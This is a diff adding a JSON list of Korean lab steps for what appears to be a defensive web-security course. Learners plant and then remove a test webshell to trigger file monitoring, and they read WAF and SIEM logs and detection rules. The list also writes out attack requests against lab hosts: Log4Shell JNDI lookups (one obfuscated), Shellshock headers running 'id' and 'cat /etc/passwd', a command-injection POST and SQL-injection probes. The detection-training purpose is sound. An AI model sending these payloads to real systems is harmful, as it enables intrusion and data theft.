@@ -1,0 +1,191 @@
+[
+  {
+    "type": "command",
+    "id": "C07-01",
+    "where": "kt66 VM · 터미널",
+    "purpose": "kt66-web 컨테이너의 셸로 들어간다.",
+    "text": "docker exec -it kt66-web /bin/bash",
+    "syntax": "5.4와 같은 명령이다.",
+    "result": "프롬프트가 kt66-web 안으로 바뀐다."
+  },
+  {
+    "type": "command",
+    "id": "C07-02",
+    "where": "kt66-web 컨테이너 · 셸",
+    "purpose": "(사전 확인) FIM 감시 경로, 업로드 폴더, 실습 파일의 현재 상태를 확인한다.",
+    "text": "grep -n -F '/var/www' /var/ossec/etc/ossec.conf\nls -ld /var/www/html/uploads\nls -l /var/www/html/uploads/book07-shell.php",
+    "syntax": "grep -n -F는 /var/www를 글자 그대로 찾고 줄 번호를 붙인다. ls -ld는 폴더 안의 목록 대신 폴더 자체의 정보를 보인다.",
+    "result": "첫 명령에서 realtime=\"yes\"가 붙은 /var/www 감시 줄이 나온다. 폴더가 없으면 mkdir -p /var/www/html/uploads로 만들고 원상복구 때 지울 수 있도록 적어 둔다. 실습 파일은 No such file or directory여야 한다. 이미 있으면 다른 파일 이름을 정한다."
+  },
+  {
+    "type": "command",
+    "id": "C07-03",
+    "where": "kt66-web 컨테이너 · 셸",
+    "purpose": "웹셸 코드를 파일로 저장한다.",
+    "text": "vim /var/www/html/uploads/book07-shell.php",
+    "syntax": "vim은 kt66-web에 설치된 터미널 편집기이다. i를 눌러 입력 모드로 바꾸고 아래 코드를 입력한 뒤 Esc, :wq, Enter로 저장하고 닫는다. 저장하지 않고 나갈 때는 Esc, :q!, Enter이다.",
+    "result": "편집기가 닫히고 프롬프트로 돌아온다. 복사용 코드는 examples/rev01/chapter07/P07-webshell.php이다."
+  },
+  {
+    "type": "command",
+    "id": "C07-04",
+    "where": "kt66-web 컨테이너 · 셸",
+    "purpose": "(사후 확인) 저장된 내용을 확인하고 컨테이너에서 나온다.",
+    "text": "cat /var/www/html/uploads/book07-shell.php\nexit",
+    "syntax": "cat은 파일 내용을 출력한다.",
+    "result": "위 코드와 같고, $_GET과 작은따옴표가 그대로 있다."
+  },
+  {
+    "type": "command",
+    "id": "C07-05",
+    "where": "kt66 VM · 터미널",
+    "purpose": "kt66-web 컨테이너의 셸로 들어간다.",
+    "text": "docker exec -it kt66-web /bin/bash",
+    "syntax": "C07-01과 같다.",
+    "result": "프롬프트가 kt66-web 안으로 바뀐다."
+  },
+  {
+    "type": "command",
+    "id": "C07-06",
+    "where": "kt66-web 컨테이너 · 셸",
+    "purpose": "실습 파일인지 확인하고 지운 뒤 지워졌는지 확인한다.",
+    "text": "cat /var/www/html/uploads/book07-shell.php\nrm -i /var/www/html/uploads/book07-shell.php\nls -l /var/www/html/uploads/book07-shell.php",
+    "syntax": "rm -i는 지우기 전에 확인을 묻는다. 경로가 맞으면 y를 입력한다.",
+    "result": "마지막 ls -l이 No such file or directory를 출력한다. uploads 폴더를 새로 만들었다면 ls -la로 비어 있는지 보고 rmdir /var/www/html/uploads로 지운다."
+  },
+  {
+    "type": "command",
+    "id": "C07-07",
+    "where": "kt66-web 컨테이너 · 셸",
+    "purpose": "kt66-web 셸에서 나온다.",
+    "text": "exit",
+    "syntax": "exit는 현재 셸을 끝낸다.",
+    "result": "kt66 VM의 프롬프트로 돌아온다."
+  },
+  {
+    "type": "command",
+    "id": "C07-08",
+    "where": "kt66 VM · 터미널",
+    "purpose": "kt66-web 컨테이너의 셸로 들어간다.",
+    "text": "docker exec -it kt66-web /bin/bash",
+    "syntax": "C07-01과 같다.",
+    "result": "프롬프트가 kt66-web 안으로 바뀐다."
+  },
+  {
+    "type": "command",
+    "id": "C07-09",
+    "where": "kt66-web 컨테이너 · 셸",
+    "purpose": "사이트 이름별 문서 루트·전달 대상·WAF 모드를 읽는다.",
+    "text": "grep -n -e ServerName -e DocumentRoot \\\n  -e 'ProxyPass ' -e SecRuleEngine \\\n  /etc/apache2/sites-enabled/*.conf",
+    "syntax": "-e는 찾을 문자열을 하나씩 지정한다. 여러 번 쓰면 그중 하나라도 들어간 줄을 출력한다. 'ProxyPass '의 뒤 공백은 ProxyPassReverse 줄을 빼기 위한 것이고, 작은따옴표가 공백까지 한 인자로 묶는다. *.conf는 셸이 파일 목록으로 펼친다.",
+    "result": "landing의 DocumentRoot /var/www/landing, juice의 ProxyPass http://juiceshop:3000/과 SecRuleEngine DetectionOnly, dvwa의 ProxyPass http://dvwa:80/이 나온다."
+  },
+  {
+    "type": "command",
+    "id": "C07-10",
+    "where": "kt66-web 컨테이너 · 셸",
+    "purpose": "웹셸 요청의 원문과 최근 WAF 감사 기록을 읽는다.",
+    "text": "grep -n -F 'book07-shell.php' \\\n  /var/log/apache2/landing_access.log\ntail -n 5 /var/log/apache2/modsec_audit.log",
+    "syntax": "IP 주소로 보낸 요청은 기본 사이트 landing의 로그에 남는다. tail -n 5는 파일 끝 다섯 줄을 출력한다. 감사 기록은 한 줄이 긴 JSON이다.",
+    "result": "웹셸 요청의 시각·출발지·404와, 최근 요청의 탐지 메시지를 읽는다."
+  },
+  {
+    "type": "command",
+    "id": "C07-11",
+    "where": "kt66-web 컨테이너 · 셸",
+    "purpose": "kt66-web 셸에서 나온다.",
+    "text": "exit",
+    "syntax": "exit는 현재 셸을 끝낸다.",
+    "result": "kt66 VM의 프롬프트로 돌아온다."
+  },
+  {
+    "type": "command",
+    "id": "C07-12",
+    "where": "kt66 VM · 터미널",
+    "purpose": "DVWA 컨테이너의 셸로 들어간다.",
+    "text": "docker exec -it kt66-dvwa /bin/bash",
+    "syntax": "6.8과 같은 명령이다.",
+    "result": "프롬프트가 kt66-dvwa 안으로 바뀐다."
+  },
+  {
+    "type": "command",
+    "id": "C07-13",
+    "where": "kt66-dvwa 컨테이너 · 셸",
+    "purpose": "명령 삽입 처리 코드를 읽고 나온다.",
+    "text": "cat /var/www/html/vulnerabilities/exec/source/low.php\nexit",
+    "syntax": "cat으로 PHP 코드를 출력한다.",
+    "result": "POST의 Submit 조건, $_REQUEST의 ip, ping -c 4와 입력을 이어 붙여 shell_exec로 실행하는 줄이 나온다. 7.5의 GET이 명령을 만들지 않는 이유를 확인한다."
+  },
+  {
+    "type": "command",
+    "id": "C07-14",
+    "where": "kt66 VM · 터미널",
+    "purpose": "Manager 컨테이너의 셸로 들어간다.",
+    "text": "docker exec -it kt66-siem /bin/bash",
+    "syntax": "4.5와 같은 명령이다.",
+    "result": "프롬프트가 kt66-siem 안으로 바뀐다."
+  },
+  {
+    "type": "command",
+    "id": "C07-15",
+    "where": "kt66-siem 컨테이너 · 셸",
+    "purpose": "Shellshock 탐지 규칙 31168의 조건을 읽고 나온다.",
+    "text": "grep -n -A 6 -F 'id=\"31168\"' \\\n  /var/ossec/ruleset/rules/0245-web_rules.xml\nexit",
+    "syntax": "-A 6은 일치한 줄 뒤 여섯 줄을 함께 출력한다. 작은따옴표는 큰따옴표를 포함한 검색어를 그대로 넘긴다. 31168을 31106·31108·31166·31162로 바꿔 같은 방법으로 읽는다.",
+    "result": "if_sid 31108과 Shellshock 구문의 regex, level=\"15\"가 나온다. 31108은 응답 코드 2·3으로 시작하는 단순 요청 분류이다."
+  },
+  {
+    "type": "command",
+    "id": "C07-16",
+    "where": "공격자 VM · 터미널",
+    "purpose": "User-Agent와 URL 쿼리에 같은 JNDI 문자열을 넣어 보낸다.",
+    "text": "curl -i --max-time 15 --get \\\n  -A '${jndi:ldap://192.168.0.202:1389/a}' \\\n  --data-urlencode \\\n  'q=${jndi:ldap://192.168.0.202:1389/a}' \\\n  http://dvwa.kt66.lab/",
+    "syntax": "--get과 --data-urlencode는 q 값을 인코딩해 URL에 붙인다(5.12).",
+    "result": "응답 코드와 본문을 읽고 Q07-03으로 찾는다. 이 명령은 LDAP 서버를 만들지 않는다."
+  },
+  {
+    "type": "command",
+    "id": "C07-17",
+    "where": "공격자 VM · 터미널",
+    "purpose": "쪼갠 JNDI를 X-Api-Version 헤더에, RMI 조회를 User-Agent에 넣는다.",
+    "text": "J='${${lower:j}ndi:ldap://192.168.0.202:1389/b}'\ncurl -i --max-time 15 \\\n  -H \"X-Api-Version: $J\" \\\n  -A '${jndi:rmi://192.168.0.202:1099/c}' \\\n  http://dvwa.kt66.lab/",
+    "syntax": "첫 줄은 긴 값을 셸 변수 J에 저장한다. 작은따옴표 안이라 ${…}가 그대로 저장된다. -H의 큰따옴표 안에서 $J는 저장한 값으로 바뀌고, 바뀐 값 속의 ${…}는 다시 해석되지 않는다. 콜론 앞이 헤더 이름, 뒤가 값이다.",
+    "result": "강의 자료의 같은 요청은 302였다. Q07-04로 찾고, X-Api-Version 값이 접속 로그에 없는 것을 확인한다."
+  },
+  {
+    "type": "command",
+    "id": "C07-18",
+    "where": "공격자 VM · 터미널",
+    "purpose": "User-Agent에 Shellshock 구문을 넣는다.",
+    "text": "curl -i --max-time 15 \\\n  -A '() { :; }; /bin/bash -c \"id\"' \\\n  http://juice.kt66.lab/cgi-bin/test.cgi",
+    "syntax": "큰따옴표는 바깥 작은따옴표 안에 있으므로 헤더 값에 그대로 들어간다.",
+    "result": "강의 자료에서는 200이었다. 본문이 Juice Shop 첫 화면인지 명령 출력인지 읽는다."
+  },
+  {
+    "type": "command",
+    "id": "C07-19",
+    "where": "공격자 VM · 터미널",
+    "purpose": "Referer 헤더에 Shellshock 구문을 넣는다.",
+    "text": "R='() { :; }; /bin/bash -c \"cat /etc/passwd\"'\ncurl -i --max-time 15 -H \"Referer: $R\" \\\n  http://dvwa.kt66.lab/cgi-bin/status",
+    "syntax": "Referer는 이전 페이지 주소를 알리는 헤더이다. C07-17처럼 값을 변수 R에 저장해 -H로 넘긴다.",
+    "result": "강의 자료에서는 403과 31166이었다."
+  },
+  {
+    "type": "command",
+    "id": "C07-20",
+    "where": "공격자 VM · 터미널",
+    "purpose": "명령 삽입 입력을 POST 본문으로 보낸다.",
+    "text": "curl -i --max-time 15 \\\n  --data 'ip=127.0.0.1;id&Submit=Submit' \\\n  http://dvwa.kt66.lab/vulnerabilities/exec/",
+    "syntax": "--data는 값을 요청 본문에 넣고 POST를 선택한다. 앰퍼샌드(&)는 두 필드를 나누며, 작은따옴표 안이라 셸의 백그라운드 기호로 해석되지 않는다.",
+    "result": "로그인 쿠키가 없어 302와 Location: login.php가 나온다. 로그인한 브라우저 POST의 결과와 구분한다."
+  },
+  {
+    "type": "command",
+    "id": "C07-21",
+    "where": "공격자 VM · 터미널",
+    "purpose": "7.7의 반복 요청을 한 번에 보낸다.",
+    "text": "for i in $(seq 1 20); do\n  curl -sS --max-time 15 -o /dev/null \\\n    -w \"%{http_code} \" \\\n    \"http://juice.kt66.lab/rest/products/search?q=%27$i\"\ndone\nprintf \"\\n\"",
+    "syntax": "seq 1 20은 1부터 20까지 출력하고, $(…)는 그 출력을 반복 목록으로 쓴다. for는 각 숫자를 i에 넣어 do~done을 반복한다. -o /dev/null은 본문을 버리고, -w \"%{http_code} \"는 응답 코드만 출력한다. 마지막 printf는 줄을 바꾼다.",
+    "result": "응답 코드 20개가 한 줄에 나온다. 강의 자료에서는 모두 500이었다. 000은 응답을 받지 못한 요청이다. 7.7을 브라우저로 마쳤다면 실행하지 않는다."
+  }
+]
